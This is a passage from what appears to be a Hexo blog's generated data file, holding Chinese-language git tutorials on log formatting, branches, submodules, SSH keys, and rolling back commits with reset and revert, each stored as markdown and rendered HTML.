class=\"headerlink\" title=\"8. 修改最近一次提交\"></a>8. 修改最近一次提交</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">git commit -m &apos;initial commit&apos;</div><div class=\"line\">git add forgotten_file</div><div class=\"line\">git commit --amend</div></pre></td></tr></table></figure>\n<h2 id=\"9-git-ssh配置\"><a href=\"#9-git-ssh配置\" class=\"headerlink\" title=\"9. git ssh配置\"></a>9. git ssh配置</h2><p>密钥&amp;公钥对生成(默认生成位置为：~/.ssh)：<br>ssh-keygen -t rsa -C “yeshaoting@163.com”</p>\n<p><strong>说明</strong>：<br>id_rsa是密钥，如同个人密码一般，别人拿到这个就能以你的身份登录git。<br>id_rsa.pub是公钥，用于在服务器端注册。当访问远程服务器时，远程服务器会拿着他那端的公钥与本机的密钥匹配，成功即可无密码访问。</p>\n<p>测试命令：</p>\n<blockquote>\n<p>git -T User@Host</p>\n</blockquote>\n<h3 id=\"git配置优先顺序\"><a href=\"#git配置优先顺序\" class=\"headerlink\" title=\"git配置优先顺序\"></a>git配置优先顺序</h3><p>local &gt; global &gt; system<br>local：项目目录/.git/config<br>global：当前用户目录/.gitconfig<br>system：/etc/gitconfig</p>\n<h2 id=\"10-配置值获取\"><a href=\"#10-配置值获取\" class=\"headerlink\" title=\"10.配置值获取\"></a>10.配置值获取</h2><p>config demo：<br>[user]<br>        name = shaotingye<br>        email = shaotingye@sohu-inc.com</p>\n<p>获取命令为：</p>\n<blockquote>\n<p>git config –get user.email</p>\n</blockquote>\n<h2 id=\"11-git-放弃本地修改-强制更新\"><a href=\"#11-git-放弃本地修改-强制更新\" class=\"headerlink\" title=\"11. git 放弃本地修改 强制更新\"></a>11. git 放弃本地修改 强制更新</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">git fetch --all</div><div class=\"line\">git reset --hard origin/master</div></pre></td></tr></table></figure>\n<p>参考：<a href=\"http://blog.csdn.net/a06062125/article/details/11727273\" target=\"_blank\" rel=\"external\">http://blog.csdn.net/a06062125/article/details/11727273</a></p>\n","excerpt":"<p><img src=\"/asserts/images/logo/git.png\" class=\"img-logo img-center\" /></p>\n<h2 id=\"1-git日志格式化\"><a href=\"#1-git日志格式化\" class=\"headerlink\" title=\"1. git日志格式化\"></a>1. git日志格式化</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">git whatchanged -1 --pretty=raw --no-abbrev</div><div class=\"line\">git log -1 --pretty=format:&apos;commit %H%ntree %T%nparent %P%nauthor %an &lt;%ae&gt; %at %ar%ncommitter %cn &lt;%ce&gt; %ct %cr%n%n %s%n%n&apos;</div></pre></td></tr></table></figure>\n<h2 id=\"2-标签按时间排序\"><a href=\"#2-标签按时间排序\" class=\"headerlink\" title=\"2. 标签按时间排序\"></a>2. 标签按时间排序</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">子模块最新的tag: git submodule foreach &apos;git tag | xargs -I@ git log --format=format:&quot;%ci %H @%n&quot; -1 @ | sort -r | head -1&apos;</div><div class=\"line\">git tag | xargs -I@ git log --format=format:&quot;%ci %h @%n&quot; -1 @ | sort</div><div class=\"line\">git tag | xargs -I@ git log --format=format:&quot;%ci %h @%n&quot; -1 @ | sort -r</div></pre></td></tr></table></figure>\n<h2 id=\"3-重置本地代码\"><a href=\"#3-重置本地代码\" class=\"headerlink\" title=\"3. 重置本地代码\"></a>3. 重置本地代码</h2><p><code>git reset --mixed</code>：此为默认方式，不带任何参数的git reset，即时这种方式，它回退到某个版本，只保留源码，回退commit和index信息<br><code>git reset --soft</code>：回退到某个版本，只回退了commit的信息，不会恢复到index file一级。如果还要提交，直接commit即可<br><code>git reset --hard</code>：彻底回退到某个版本，本地的源码也会变为上一个版本的内容</p>\n<h2 id=\"4-创建分支\"><a href=\"#4-创建分支\" class=\"headerlink\" title=\"4. 创建分支\"></a>4. 创建分支</h2><p>git branch develop</p>\n<h2 id=\"5-切换分支\"><a href=\"#5-切换分支\" class=\"headerlink\" title=\"5. 切换分支\"></a>5. 切换分支</h2><p>git checkout develop</p>","more":"<h2 id=\"6-查看分支版本\"><a href=\"#6-查看分支版本\" class=\"headerlink\" title=\"6. 查看分支版本\"></a>6. 查看分支版本</h2><p>git branch<br>git branch -v<br>git branch -r</p>\n<h2 id=\"7-项目多模块更新\"><a href=\"#7-项目多模块更新\" class=\"headerlink\" title=\"7. 项目多模块更新\"></a>7. 项目多模块更新</h2><p>git submodule init<br>git submodule update<br>git submodule status</p>\n<h2 id=\"8-修改最近一次提交\"><a href=\"#8-修改最近一次提交\" class=\"headerlink\" title=\"8. 修改最近一次提交\"></a>8. 修改最近一次提交</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">git commit -m &apos;initial commit&apos;</div><div class=\"line\">git add forgotten_file</div><div class=\"line\">git commit --amend</div></pre></td></tr></table></figure>\n<h2 id=\"9-git-ssh配置\"><a href=\"#9-git-ssh配置\" class=\"headerlink\" title=\"9. git ssh配置\"></a>9. git ssh配置</h2><p>密钥&amp;公钥对生成(默认生成位置为：~/.ssh)：<br>ssh-keygen -t rsa -C “yeshaoting@163.com”</p>\n<p><strong>说明</strong>：<br>id_rsa是密钥，如同个人密码一般，别人拿到这个就能以你的身份登录git。<br>id_rsa.pub是公钥，用于在服务器端注册。当访问远程服务器时，远程服务器会拿着他那端的公钥与本机的密钥匹配，成功即可无密码访问。</p>\n<p>测试命令：</p>\n<blockquote>\n<p>git -T User@Host</p>\n</blockquote>\n<h3 id=\"git配置优先顺序\"><a href=\"#git配置优先顺序\" class=\"headerlink\" title=\"git配置优先顺序\"></a>git配置优先顺序</h3><p>local &gt; global &gt; system<br>local：项目目录/.git/config<br>global：当前用户目录/.gitconfig<br>system：/etc/gitconfig</p>\n<h2 id=\"10-配置值获取\"><a href=\"#10-配置值获取\" class=\"headerlink\" title=\"10.配置值获取\"></a>10.配置值获取</h2><p>config demo：<br>[user]<br>        name = shaotingye<br>        email = shaotingye@sohu-inc.com</p>\n<p>获取命令为：</p>\n<blockquote>\n<p>git config –get user.email</p>\n</blockquote>\n<h2 id=\"11-git-放弃本地修改-强制更新\"><a href=\"#11-git-放弃本地修改-强制更新\" class=\"headerlink\" title=\"11. git 放弃本地修改 强制更新\"></a>11. git 放弃本地修改 强制更新</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">git fetch --all</div><div class=\"line\">git reset --hard origin/master</div></pre></td></tr></table></figure>\n<p>参考：<a href=\"http://blog.csdn.net/a06062125/article/details/11727273\">http://blog.csdn.net/a06062125/article/details/11727273</a></p>"},{"title":"git拉取submodule","date":"2015-12-29T05:58:00.000Z","_content":"\n<img src=\"/asserts/images/logo/git.png\" class=\"img-logo img-center\" />\n\n\n## 一、执行步骤\n\n### 1. 添加子模块配置\n子模块的URL加入到.git/config\ngit submodule init\n\n### 2. 查看模块状态\ngit submodule status\n\n### 3. 拉取子模块\n克隆子模块的仓库和签出父项目中指定的那个版本\ngit submodule update\n\n### 4. 切换子模块版本\ngit submodule foreach git checkout develop\n\n\n## 二、参考文档\n[Git Community Book 中文版 - 子模块](http://gitbook.liuhui998.com/5_10.html)\n","source":"_posts/article/git/git拉取submodule.md","raw":"categories:\n  - 版本控制\ntitle: git拉取submodule\ntags:\n  - git\ndate: 2015-12-29 13:58:00\n---\n\n<img src=\"/asserts/images/logo/git.png\" class=\"img-logo img-center\" />\n\n\n## 一、执行步骤\n\n### 1. 添加子模块配置\n子模块的URL加入到.git/config\ngit submodule init\n\n### 2. 查看模块状态\ngit submodule status\n\n### 3. 拉取子模块\n克隆子模块的仓库和签出父项目中指定的那个版本\ngit submodule update\n\n### 4. 切换子模块版本\ngit submodule foreach git checkout develop\n\n\n## 二、参考文档\n[Git Community Book 中文版 - 子模块](http://gitbook.liuhui998.com/5_10.html)\n","slug":"article/git/git拉取submodule","published":1,"updated":"2016-08-20T07:13:48.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cis6vlxq100135nbt2oyr27d0","content":"<p><img src=\"/asserts/images/logo/git.png\" class=\"img-logo img-center\"></p>\n<h2 id=\"一、执行步骤\"><a href=\"#一、执行步骤\" class=\"headerlink\" title=\"一、执行步骤\"></a>一、执行步骤</h2><h3 id=\"1-添加子模块配置\"><a href=\"#1-添加子模块配置\" class=\"headerlink\" title=\"1. 添加子模块配置\"></a>1. 添加子模块配置</h3><p>子模块的URL加入到.git/config<br>git submodule init</p>\n<h3 id=\"2-查看模块状态\"><a href=\"#2-查看模块状态\" class=\"headerlink\" title=\"2. 查看模块状态\"></a>2. 查看模块状态</h3><p>git submodule status</p>\n<h3 id=\"3-拉取子模块\"><a href=\"#3-拉取子模块\" class=\"headerlink\" title=\"3. 拉取子模块\"></a>3. 拉取子模块</h3><p>克隆子模块的仓库和签出父项目中指定的那个版本<br>git submodule update</p>\n<h3 id=\"4-切换子模块版本\"><a href=\"#4-切换子模块版本\" class=\"headerlink\" title=\"4. 切换子模块版本\"></a>4. 切换子模块版本</h3><p>git submodule foreach git checkout develop</p>\n<h2 id=\"二、参考文档\"><a href=\"#二、参考文档\" class=\"headerlink\" title=\"二、参考文档\"></a>二、参考文档</h2><p><a href=\"http://gitbook.liuhui998.com/5_10.html\" target=\"_blank\" rel=\"external\">Git Community Book 中文版 - 子模块</a></p>\n","excerpt":"","more":"<p><img src=\"/asserts/images/logo/git.png\" class=\"img-logo img-center\" /></p>\n<h2 id=\"一、执行步骤\"><a href=\"#一、执行步骤\" class=\"headerlink\" title=\"一、执行步骤\"></a>一、执行步骤</h2><h3 id=\"1-添加子模块配置\"><a href=\"#1-添加子模块配置\" class=\"headerlink\" title=\"1. 添加子模块配置\"></a>1. 添加子模块配置</h3><p>子模块的URL加入到.git/config<br>git submodule init</p>\n<h3 id=\"2-查看模块状态\"><a href=\"#2-查看模块状态\" class=\"headerlink\" title=\"2. 查看模块状态\"></a>2. 查看模块状态</h3><p>git submodule status</p>\n<h3 id=\"3-拉取子模块\"><a href=\"#3-拉取子模块\" class=\"headerlink\" title=\"3. 拉取子模块\"></a>3. 拉取子模块</h3><p>克隆子模块的仓库和签出父项目中指定的那个版本<br>git submodule update</p>\n<h3 id=\"4-切换子模块版本\"><a href=\"#4-切换子模块版本\" class=\"headerlink\" title=\"4. 切换子模块版本\"></a>4. 切换子模块版本</h3><p>git submodule foreach git checkout develop</p>\n<h2 id=\"二、参考文档\"><a href=\"#二、参考文档\" class=\"headerlink\" title=\"二、参考文档\"></a>二、参考文档</h2><p><a href=\"http://gitbook.liuhui998.com/5_10.html\">Git Community Book 中文版 - 子模块</a></p>\n"},{"title":"回滚git代码版本","date":"2015-12-29T05:58:00.000Z","_content":"\n<img src=\"/asserts/images/logo/git.png\" class=\"img-logo img-center\" />\n\n\n**参考**：[Git的撤消操作 - 重置, 签出 和 撤消](http://gitbook.liuhui998.com/4_9.html)\n\n错提交代码，或者某个版本代码之后想要回滚回来的话，就会遇到需要回滚代码版本的问题。\n\n根据代码当前提交状态，回滚操作可以分为二类：\n1. 未提交代码\n2. 已提交代码\n\n\n## 一、回滚未提交代码\n\n[git reset三种方式](http://blog.csdn.net/wujiangguizhen/article/details/10609647)：\n1. 只回滚本地代码库(HEAD)内容，不回滚索引(index)和工作区(working)内容。\n`git reset --soft 版本号`\n\n2. (**默认**)只回滚本地代码库(HEAD)和索引(index)内容，不回滚工作区(working)内容。\n`git reset --mixed 版本号`\n\n3. 回滚本地代码库(HEAD)、索引(index)和工作区(working)内容。\n`git reset --hard 版本号`\n\n<!-- more -->\n\n**常用命令**\n\n1. 回滚到上一个版本\n`git reset HEAD`\n\n2. 回滚到上上个版本\n`git reset HEAD^`\n\n3. 回滚到指定版本\n`git reset 057d`\n\n**注**：此处回滚的含义是与当前分支远程代码库(target)内容保持一致。\n\n### 举例说明\n\n**参考**：[git-reset](https://git-scm.com/docs/git-reset)\n\n#### 举例1\n| # | working | index | HEAD | target |\n|----|----|----|----|----|\n| current | A | B | C | D |\n| soft | A | B | D | D |\n| mixed | A | D | D | D |\n| hard | D | D | D | D |\n\n#### 举例2\n| # | working | index | HEAD | target |\n|----|----|----|----|----|\n| current | A | B | C | C |\n| soft | A | B | C | C |\n| mixed | A | C | C | C |\n| hard | C | C | C | C |\n\n\n\n## 二、回滚已提交代码\n\n\n### 1. 回滚已经提交，且已发布代码\n\n参考：[git revert 用法](http://blog.chinaunix.net/uid-26770731-id-3285880.html)\n\ngit revert撤销某次操作，此次操作之前和之后的commit和history都会保留，并且把这次撤销作为一次最新的提交。\ngit revert是提交一个新的版本，将需要revert的版本的内容再反向修改回去，版本会递增，不影响之前提交的内容。\n\n**常用命令**\n\n1. 撤销前一次 commit\n`git revert HEAD`\n\n2. 撤销前前一次 commit\n`git revert HEAD^`\n\n3. 撤销指定的版本，撤销也会作为一次提交进行保存\n`git revert commit fa042ce57ebbe5bb9c8db709f719cec2c58ee7ff`\n\n\n#### 举例说明\n代码版本库中间一段提交内容如下：\n```\ncommit c15ebaadf86bde882035a68e09f0b7832ea271f6\n    删除无用文件\n\ncommit 763ab06edb1b5054fbd12e94317e2f13ac4b2af5\n    修改静态资源版本\n\ncommit 277563b24904f3f70eb210f6fa1d3f3f1ee914ac\n    pvrs接口切回测试环境\n\ncommit a00d98c53e86182054eb4e77a18e3044f5f9d658\n    搜索无数据返回，导致空指针异常处理\n```\n\n如果期望代码回滚到 **277563b24904f3f70eb210f6fa1d3f3f1ee914ac** 这个状态的话，则需要撤销后一个版本 **763ab06edb1b5054fbd12e94317e2f13ac4b2af5** 以后的所有代码提交。\n执行命令：`git revert 763ab06edb1b5054fbd12e94317e2f13ac4b2af5`\n\n\n\n### 2. 回滚已经提交，但未发布代码\n\n**参考**：[Git 基础 - 撤消操作](https://git-scm.com/book/zh/v1/Git-%E5%9F%BA%E7%A1%80-%E6%92%A4%E6%B6%88%E6%93%8D%E4%BD%9C)\n\n``` shell\ngit commit -m 'initial commit'\ngit add forgotten_file\ngit commit --amend\n```\n\n","source":"_posts/article/git/如何使用git回退部分修改.md","raw":"categories:\n  - 版本控制\ntags:\n  - git\ntitle: 回滚git代码版本\ndate: 2015-12-29 13:58:00\n---\n\n<img src=\"/asserts/images/logo/git.png\" class=\"img-logo img-center\" />\n\n\n**参考**：[Git的撤消操作 - 重置, 签出 和 撤消](http://gitbook.liuhui998.com/4_9.html)\n\n错提交代码，或者某个版本代码之后想要回滚回来的话，就会遇到需要回滚代码版本的问题。\n\n根据代码当前提交状态，回滚操作可以分为二类：\n1. 未提交代码\n2. 已提交代码\n\n\n## 一、回滚未提交代码\n\n[git reset三种方式](http://blog.csdn.net/wujiangguizhen/article/details/10609647)：\n1. 只回滚本地代码库(HEAD)内容，不回滚索引(index)和工作区(working)内容。\n`git reset --soft 版本号`\n\n2. (**默认**)只回滚本地代码库(HEAD)和索引(index)内容，不回滚工作区(working)内容。\n`git reset --mixed 版本号`\n\n3. 回滚本地代码库(HEAD)、索引(index)和工作区(working)内容。\n`git reset --hard 版本号`\n\n<!-- more -->\n\n**常用命令**\n\n1. 回滚到上一个版本\n`git reset HEAD`\n\n2. 回滚到上上个版本\n`git reset HEAD^`\n\n3. 回滚到指定版本\n`git reset 057d`\n\n**注**：此处回滚的含义是与当前分支远程代码库(target)内容保持一致。\n\n### 举例说明\n\n**参考**：[git-reset](https://git-scm.com/docs/git-reset)\n\n#### 举例1\n| # | working | index | HEAD | target |\n|----|----|----|----|----|\n| current | A | B | C | D |\n| soft | A | B | D | D |\n| mixed | A | D | D | D |\n| hard | D | D | D | D |\n\n#### 举例2\n| # | working | index | HEAD | target |\n|----|----|----|----|----|\n| current | A | B | C | C |\n| soft | A | B | C | C |\n| mixed | A | C | C | C |\n| hard | C | C | C | C |\n\n\n\n## 二、回滚已提交代码\n\n\n### 1. 回滚已经提交，且已发布代码\n\n参考：[git revert 用法](http://blog.chinaunix.net/uid-26770731-id-3285880.html)\n\ngit revert撤销某次操作，此次操作之前和之后的commit和history都会保留，并且把这次撤销作为一次最新的提交。\ngit revert是提交一个新的版本，将需要revert的版本的内容再反向修改回去，版本会递增，不影响之前提交的内容。\n\n**常用命令**\n\n1. 撤销前一次 commit\n`git revert HEAD`\n\n2. 撤销前前一次 commit\n`git revert HEAD^`\n\n3. 撤销指定的版本，撤销也会作为一次提交进行保存\n`git revert commit fa042ce57ebbe5bb9c8db709f719cec2c58ee7ff`\n\n\n#### 举例说明\n代码版本库中间一段提交内容如下：\n```\ncommit c15ebaadf86bde882035a68e09f0b7832ea271f6\n    删除无用文件\n\ncommit 763ab06edb1b5054fbd12e94317e2f13ac4b2af5\n    修改静态资源版本\n\ncommit 277563b24904f3f70eb210f6fa1d3f3f1ee914ac\n    pvrs接口切回测试环境\n\ncommit a00d98c53e86182054eb4e77a18e3044f5f9d658\n    搜索无数据返回，导致空指针异常处理\n```\n\n如果期望代码回滚到 **277563b24904f3f70eb210f6fa1d3f3f1ee914ac** 这个状态的话，则需要撤销后一个版本 **763ab06edb1b5054fbd12e94317e2f13ac4b2af5** 以后的所有代码提交。\n执行命令：`git revert 763ab06edb1b5054fbd12e94317e2f13ac4b2af5`\n\n\n\n### 2. 回滚已经提交，但未发布代码\n\n**参考**：[Git 基础 - 撤消操作](https://git-scm.com/book/zh/v1/Git-%E5%9F%BA%E7%A1%80-%E6%92%A4%E6%B6%88%E6%93%8D%E4%BD%9C)\n\n``` shell\ngit commit -m 'initial commit'\ngit add forgotten_file\ngit commit --amend\n```\n\n","slug":"article/git/如何使用git回退部分修改","published":1,"updated":"2016-08-20T07:13:48.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cis6vlxqb00155nbtkd9r1xsi","content":"<p><img src=\"/asserts/images/logo/git.png\" class=\"img-logo img-center\"></p>\n<p><strong>参考</strong>：<a href=\"http://gitbook.liuhui998.com/4_9.html\" target=\"_blank\" rel=\"external\">Git的撤消操作 - 重置, 签出 和 撤消</a></p>\n<p>错提交代码，或者某个版本代码之后想要回滚回来的话，就会遇到需要回滚代码版本的问题。</p>\n<p>根据代码当前提交状态，回滚操作可以分为二类：</p>\n<ol>\n<li>未提交代码</li>\n<li>已提交代码</li>\n</ol>\n<h2 id=\"一、回滚未提交代码\"><a href=\"#一、回滚未提交代码\" class=\"headerlink\" title=\"一、回滚未提交代码\"></a>一、回滚未提交代码</h2><p><a href=\"http://blog.csdn.net/wujiangguizhen/article/details/10609647\" target=\"_blank\" rel=\"external\">git reset三种方式</a>：</p>\n<ol>\n<li><p>只回滚本地代码库(HEAD)内容，不回滚索引(index)和工作区(working)内容。<br><code>git reset --soft 版本号</code></p>\n</li>\n<li><p>(<strong>默认</strong>)只回滚本地代码库(HEAD)和索引(index)内容，不回滚工作区(working)内容。<br><code>git reset --mixed 版本号</code></p>\n</li>\n<li><p>回滚本地代码库(HEAD)、索引(index)和工作区(working)内容。<br><code>git reset --hard 版本号</code></p>\n</li>\n</ol>\n<a id=\"more\"></a>\n<p><strong>常用命令</strong></p>\n<ol>\n<li><p>回滚到上一个版本<br><code>git reset HEAD</code></p>\n</li>\n<li><p>回滚到上上个版本<br><code>git reset HEAD^</code></p>\n</li>\n<li><p>回滚到指定版本<br><code>git reset 057d</code></p>\n</li>\n</ol>\n<p><strong>注</strong>：此处回滚的含义是与当前分支远程代码库(target)内容保持一致。</p>\n<h3 id=\"举例说明\"><a href=\"#举例说明\" class=\"headerlink\" title=\"举例说明\"></a>举例说明</h3><p><strong>参考</strong>：<a href=\"https://git-scm.com/docs/git-reset\" target=\"_blank\" rel=\"external\">git-reset</a></p>\n<h4 id=\"举例1\"><a href=\"#举例1\" class=\"headerlink\" title=\"举例1\"></a>举例1</h4><table>\n<thead>\n<tr>\n<th>#</th>\n<th>working</th>\n<th>index</th>\n<th>HEAD</th>\n<th>target</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>current</td>\n<td>A</td>\n<td>B</td>\n<td>C</td>\n<td>D</td>\n</tr>\n<tr>\n<td>soft</td>\n<td>A</td>\n<td>B</td>\n<td>D</td>\n<td>D</td>\n</tr>\n<tr>\n<td>mixed</td>\n<td>A</td>\n<td>D</td>\n<td>D</td>\n<td>D</td>\n</tr>\n<tr>\n<td>hard</td>\n<td>D</td>\n<td>D</td>\n<td>D</td>\n<td>D</td>\n</tr>\n</tbody>\n</table>\n<h4 id=\"举例2\"><a href=\"#举例2\" class=\"headerlink\" title=\"举例2\"></a>举例2</h4><table>\n<thead>\n<tr>\n<th>#</th>\n<th>working</th>\n<th>index</th>\n<th>HEAD</th>\n<th>target</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>current</td>\n<td>A</td>\n<td>B</td>\n<td>C</td>\n<td>C</td>\n</tr>\n<tr>\n<td>soft</td>\n<td>A</td>\n<td>B</td>\n<td>C</td>\n<td>C</td>\n</tr>\n<tr>\n<td>mixed</td>\n<td>A</td>\n<td>C</td>\n<td>C</td>\n<td>C</td>\n</tr>\n<tr>\n<td>hard</td>\n<td>C</td>\n<td>C</td>\n<td>C</td>\n<td>C</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"二、回滚已提交代码\"><a href=\"#二、回滚已提交代码\" class=\"headerlink\" title=\"二、回滚已提交代码\"></a>二、回滚已提交代码</h2><h3 id=\"1-回滚已经提交，且已发布代码\"><a href=\"#1-回滚已经提交，且已发布代码\" class=\"headerlink\" title=\"1. 回滚已经提交，且已发布代码\"></a>1. 回滚已经提交，且已发布代码</h3><p>参考：<a href=\"http://blog.chinaunix.net/uid-26770731-id-3285880.html\" target=\"_blank\" rel=\"external\">git revert 用法</a></p>\n<p>git revert撤销某次操作，此次操作之前和之后的commit和history都会保留，并且把这次撤销作为一次最新的提交。<br>git revert是提交一个新的版本，将需要revert的版本的内容再反向修改回去，版本会递增，不影响之前提交的内容。</p>\n<p><strong>常用命令</strong></p>\n<ol>\n<li><p>撤销前一次 commit<br><code>git revert HEAD</code></p>\n</li>\n<li><p>撤销前前一次 commit<br><code>git revert HEAD^</code></p>\n</li>\n<li><p>撤销指定的版本，撤销也会作为一次提交进行保存<br><code>git revert commit fa042ce57ebbe5bb9c8db709f719cec2c58ee7ff</code></p>\n</li>\n</ol>\n<h4 id=\"举例说明-1\"><a href=\"#举例说明-1\" class=\"headerlink\" title=\"举例说明\"></a>举例说明</h4><p>代码版本库中间一段提交内容如下：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\">commit c15ebaadf86bde882035a68e09f0b7832ea271f6</div><div class=\"line\">    删除无用文件</div><div class=\"line\"></div><div class=\"line\">commit 763ab06edb1b5054fbd12e94317e2f13ac4b2af5</div><div class=\"line\">    修改静态资源版本</div><div class=\"line\"></div><div class=\"line\">commit 277563b24904f3f70eb210f6fa1d3f3f1ee914ac</div><div class=\"line\">    pvrs接口切回测试环境</div><div class=\"line\"></div><div class=\"line\">commit a00d98c53e86182054eb4e77a18e3044f5f9d658</div><div class=\"line\">    搜索无数据返回，导致空指针异常处理</div></pre></td></tr></table></figure></p>\n<p>如果期望代码回滚到 <strong>277563b24904f3f70eb210f6fa1d3f3f1ee914ac</strong> 这个状态的话，则需要撤销后一个版本 <strong>763ab06edb1b5054fbd12e94317e2f13ac4b2af5</strong> 以后的所有代码提交。<br>执行命令：<code>git revert 763ab06edb1b5054fbd12e94317e2f13ac4b2af5</code></p>\n<h3 id=\"2-回滚已经提交，但未发布代码\"><a href=\"#2-回滚已经提交，但未发布代码\" class=\"headerlink\" title=\"2. 回滚已经提交，但未发布代码\"></a>2. 回滚已经提交，但未发布代码</h3><p><strong>参考</strong>：<a href=\"https://git-scm.com/book/zh/v1/Git-%E5%9F%BA%E7%A1%80-%E6%92%A4%E6%B6%88%E6%93%8D%E4%BD%9C\" target=\"_blank\" rel=\"external\">Git 基础 - 撤消操作</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">git commit -m &apos;initial commit&apos;</div><div class=\"line\">git add forgotten_file</div><div class=\"line\">git commit --amend</div></pre></td></tr></table></figure>\n","excerpt":"<p><img src=\"/asserts/images/logo/git.png\" class=\"img-logo img-center\" /></p>\n<p><strong>参考</strong>：<a href=\"http://gitbook.liuhui998.com/4_9.html\">Git的撤消操作 - 重置, 签出 和 撤消</a></p>\n<p>错提交代码，或者某个版本代码之后想要回滚回来的话，就会遇到需要回滚代码版本的问题。</p>\n<p>根据代码当前提交状态，回滚操作可以分为二类：</p>\n<ol>\n<li>未提交代码</li>\n<li>已提交代码</li>\n</ol>\n<h2 id=\"一、回滚未提交代码\"><a href=\"#一、回滚未提交代码\" class=\"headerlink\" title=\"一、回滚未提交代码\"></a>一、回滚未提交代码</h2><p><a href=\"http://blog.csdn.net/wujiangguizhen/article/details/10609647\">git reset三种方式</a>：</p>\n<ol>\n<li><p>只回滚本地代码库(HEAD)内容，不回滚索引(index)和工作区(working)内容。<br><code>git reset --soft 版本号</code></p>\n</li>\n<li><p>(<strong>默认</strong>)只回滚本地代码库(HEAD)和索引(index)内容，不回滚工作区(working)内容。<br><code>git reset --mixed 版本号</code></p>\n</li>\n<li><p>回滚本地代码库(HEAD)、索引(index)和工作区(working)内容。<br><code>git reset --hard 版本号</code></p>\n</li>\n</ol>","more":"<p><strong>常用命令</strong></p>\n<ol>\n<li><p>回滚到上一个版本<br><code>git reset HEAD</code></p>\n</li>\n<li><p>回滚到上上个版本<br><code>git reset HEAD^</code></p>\n</li>\n<li><p>回滚到指定版本<br><code>git reset 057d</code></p>\n</li>\n</ol>\n<p><strong>注</strong>：此处回滚的含义是与当前分支远程代码库(target)内容保持一致。</p>\n<h3 id=\"举例说明\"><a href=\"#举例说明\" class=\"headerlink\" title=\"举例说明\"></a>举例说明</h3><p><strong>参考</strong>：<a href=\"https://git-scm.com/docs/git-reset\">git-reset</a></p>\n<h4 id=\"举例1\"><a href=\"#举例1\" class=\"headerlink\" title=\"举例1\"></a>举例1</h4><table>\n<thead>\n<tr>\n<th>#</th>\n<th>working</th>\n<th>index</th>\n<th>HEAD</th>\n<th>target</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>current</td>\n<td>A</td>\n<td>B</td>\n<td>C</td>\n<td>D</td>\n</tr>\n<tr>\n<td>soft</td>\n<td>A</td>\n<td>B</td>\n<td>D</td>\n<td>D</td>\n</tr>\n<tr>\n<td>mixed</td>\n<td>A</td>\n<td>D</td>\n<td>D</td>\n<td>D</td>\n</tr>\n<tr>\n<td>hard</td>\n<td>D</td>\n<td>D</td>\n<td>D</td>\n<td>D</td>\n</tr>\n</tbody>\n</table>\n<h4 id=\"举例2\"><a href=\"#举例2\" class=\"headerlink\" title=\"举例2\"></a>举例2</h4><table>\n<thead>\n<tr>\n<th>#</th>\n<th>working</th>\n<th>index</th>\n<th>HEAD</th>\n<th>target</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>current</td>\n<td>A</td>\n<td>B</td>\n<td>C</td>\n<td>C</td>\n</tr>\n<tr>\n<td>soft</td>\n<td>A</td>\n<td>B</td>\n<td>C</td>\n<td>C</td>\n</tr>\n<tr>\n<td>mixed</td>\n<td>A</td>\n<td>C</td>\n<td>C</td>\n<td>C</td>\n</tr>\n<tr>\n<td>hard</td>\n<td>C</td>\n<td>C</td>\n<td>C</td>\n<td>C</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"二、回滚已提交代码\"><a href=\"#二、回滚已提交代码\" class=\"headerlink\" title=\"二、回滚已提交代码\"></a>二、回滚已提交代码</h2><h3 id=\"1-回滚已经提交，且已发布代码\"><a href=\"#1-回滚已经提交，且已发布代码\" class=\"headerlink\" title=\"1. 回滚已经提交，且已发布代码\"></a>1. 回滚已经提交，且已发布代码</h3><p>参考：<a href=\"http://blog.chinaunix.net/uid-26770731-id-3285880.html\">git revert 用法</a></p>\n<p>git revert撤销某次操作，此次操作之前和之后的commit和history都会保留，并且把这次撤销作为一次最新的提交。<br>git revert是提交一个新的版本，将需要revert的版本的内容再反向修改回去，版本会递增，不影响之前提交的内容。</p>\n<p><strong>常用命令</strong></p>\n<ol>\n<li><p>撤销前一次 commit<br><code>git revert HEAD</code></p>\n</li>\n<li><p>撤销前前一次 commit<br><code>git revert HEAD^</code></p>\n</li>\n<li><p>撤销指定的版本，撤销也会作为一次提交进行保存<br><code>git revert commit fa042ce57ebbe5bb9c8db709f719cec2c58ee7ff</code></p>\n</li>\n</ol>\n<h4 id=\"举例说明-1\"><a href=\"#举例说明-1\" class=\"headerlink\" title=\"举例说明\"></a>举例说明</h4><p>代码版本库中间一段提交内容如下：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div 